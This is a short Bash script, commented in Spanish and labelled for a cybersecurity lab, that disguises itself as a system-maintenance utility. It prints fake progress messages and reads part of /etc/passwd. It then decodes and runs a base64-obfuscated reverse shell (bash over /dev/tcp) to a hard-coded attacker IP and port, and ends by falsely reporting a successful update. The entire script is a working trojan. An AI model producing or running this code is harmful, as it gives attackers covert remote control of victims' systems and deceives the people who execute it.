#!/bin/bash

# ========================================================
# Script: mantenimiento_pro.sh (virus.sh)
# Uso: Laboratorio de Ciberseguridad
# ========================================================

# Configuración del atacante
IP_ATACANTE="192.168.1.109"
PUERTO=4444

echo "Iniciando mantenimiento del sistema..."
# Simulamos actividad legítima leyendo parte del archivo passwd
cat /etc/passwd | head -n 5
echo "Procesando paquetes y verificando dependencias..."

# CARGA ÚTIL (PAYLOAD) OFUSCADA
# Decodifica y ejecuta una reverse shell en segundo plano
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTA5LzQ0NDQgMD4mMSAm" | base64 -d | bash

sleep 2
echo "Actualización completada correctamente."
